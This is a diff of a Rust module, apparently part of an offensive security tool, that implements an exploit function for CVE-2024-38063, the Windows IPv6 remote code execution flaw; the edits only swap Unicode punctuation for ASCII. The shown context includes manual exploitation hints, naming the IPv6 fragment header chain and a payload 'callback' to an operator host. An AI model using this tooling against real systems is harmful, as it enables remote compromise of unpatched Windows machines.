@@ -1,4 +1,4 @@
-//! CVE-2024-38063 — Windows TCP/IP IPv6 RCE.
+//! CVE-2024-38063 -- Windows TCP/IP IPv6 RCE.
 //!
 //! A critical vulnerability in the Windows TCP/IP stack allows remote code
 //! execution via specially crafted IPv6 packets. The vulnerability exists in
@@ -14,7 +14,7 @@
 //!
 //! # References
 //! - CVE-2024-38063: CVSS 9.8, August 2024 Patch Tuesday
-//! - Affects Windows 10/11, Server 2008–2025 pre-August 2024 CU
+//! - Affects Windows 10/11, Server 2008--2025 pre-August 2024 CU
 //! - Wormable, no auth required
 
 use overthrone_core::error::Result;
@@ -103,7 +103,7 @@ pub struct Ipv6RceResult {
 pub async fn exploit_ipv6_rce(config: &Ipv6RceConfig) -> Result<Ipv6RceResult> {
     let mut log = Vec::new();
     log.push(format!(
-        "CVE-2024-38063: IPv6 RCE — target={}:{}",
+        "CVE-2024-38063: IPv6 RCE -- target={}:{}",
         config.target_ipv6, config.target_port
     ));
 
@@ -161,7 +161,7 @@ pub async fn exploit_ipv6_rce(config: &Ipv6RceConfig) -> Result<Ipv6RceResult> {
             "  To exploit manually: send crafted IPv6 fragment sequence to target".to_string(),
         );
         log.push(
-            "  Fragment header chain: Hop-by-Hop → Fragment → Destination Options".to_string(),
+            "  Fragment header chain: Hop-by-Hop -> Fragment -> Destination Options".to_string(),
         );
         log.push(format!(
             "  Payload after overflow: callback to {}:{}",
